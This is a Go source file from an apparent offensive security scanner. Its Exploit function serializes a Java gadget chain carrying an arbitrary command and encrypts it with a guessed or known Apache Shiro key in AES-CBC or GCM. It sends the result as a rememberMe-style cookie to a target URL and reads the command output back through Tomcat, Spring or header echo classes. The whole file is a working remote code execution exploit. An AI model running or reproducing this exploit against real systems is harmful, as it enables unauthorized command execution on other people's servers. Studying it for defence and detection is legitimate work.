package shiro

import (
    "errors"
    "github.com/yaklang/yaklang/common/yak/yaklib/codec"
    "github.com/yaklang/yaklang/common/yso"
    "github.com/yhy0/Jie/pkg/protocols/httpx"
    "github.com/yhy0/Jie/pkg/util"
    "github.com/yhy0/logging"
    "strings"
)

/**
   @author yhy
   @since 2023/8/20
   @desc //TODO
**/

func Exploit(u, cookieName, key, mode, gadget string, cmd string, echo string) string {
    keyDecoded, _ := codec.DecodeBase64(key) // 生成key
    
    gadget = strings.Split(gadget, " | ")[0]
    gadgetObj, err := getGadgetObj(gadget, cmd, echo)
    if err != nil {
        logging.Logger.Errorln(err)
        return ""
    }
    gadgetBytes, err := yso.ToBytes(gadgetObj)
    if err != nil {
        logging.Logger.Errorln(err)
        return ""
    }
    
    payload := ""
    payloadPadding := codec.PKCS5Padding(gadgetBytes, 16)
    
    // 加密payload
    if mode == "GCM" {
        encodePayload, err := codec.AESGCMEncrypt(keyDecoded, payloadPadding, nil)
        if err != nil {
            logging.Logger.Errorln(err)
            return ""
        }
        if encodePayload == nil {
            logging.Logger.Errorln(err)
            return ""
        }
        payload = codec.EncodeBase64(append(encodePayload))
    } else {
        iv := []byte(util.RandomString(16))
        encodePayload, err := codec.AESCBCEncrypt(keyDecoded, payloadPadding, iv)
        if err != nil {
            logging.Logger.Errorln(err)
            return ""
        }
        if encodePayload == nil {
            logging.Logger.Errorln(err)
            return ""
        }
        payload = codec.EncodeBase64(append(iv, encodePayload...))
    }
    var header = make(map[string]string, 1)
    header["Cookie"] = cookieName + "=" + payload
    header["Accept-Language"] = "zh-CN,zh;q=1.9"
    if res, err := httpx.Request(u, "GET", "", header); err == nil {
        if echo == "header" || echo == "spring" {
            return res.Header.Get("testcmd")
        }
        return res.Body
    }
    return ""
}

func getGadgetObj(gadget string, cmd string, echo string) (gadgetObj *yso.JavaObject, err error) {
    if getGadget, ok := gadgets[gadget]; ok {
        if echo == "tomcat" {
            gadgetObj, err = getGadget(yso.SetTomcatEchoEvilClass(), yso.SetParam(cmd), yso.SetEchoBody(), yso.SetExecAction(), yso.SetClassName(util.RandomString(8)))
            if err != nil {
                logging.Logger.Errorln(err)
                return
            }
        } else if echo == "spring" {
            // gadgetObj, err = getGadget(yso.SetClassSpringEchoTemplate(), yso.SetHeader("testcmd", cmd), yso.SetParam(cmd), yso.SetExecAction(), yso.SetClassName(util.RandomString(8)))
            
            gadgetObj, err = getGadget(yso.SetClassSpringEchoTemplate(), yso.SetParam(cmd), yso.SetEchoBody(), yso.SetExecAction(), yso.SetClassName(util.RandomString(8)))
            if err != nil {
                logging.Logger.Errorln(err)
                return
            }
        } else if echo == "tw" {
            gadgetObj, err = getGadget(yso.SetClassMultiEchoTemplate(), yso.SetParam(cmd), yso.SetEchoBody(), yso.SetExecAction(), yso.SetClassName(util.RandomString(8)))
            if err != nil {
                logging.Logger.Errorln(err)
                return
            }
        } else if echo == "header" {
            gadgetObj, err = getGadget(yso.SetHeaderEchoEvilClass(), yso.SetHeader("testcmd", cmd), yso.SetExecAction(), yso.SetClassName(util.RandomString(8)))
            if err != nil {
                logging.Logger.Errorln(err)
                return
            }
        } else {
            return nil, errors.New("unsupported echo " + echo + ", eg:tomcat,spring,tw,header")
        }
        
        return gadgetObj, nil
    }
    
    return nil, errors.New("unsupported gadget " + gadget)
}
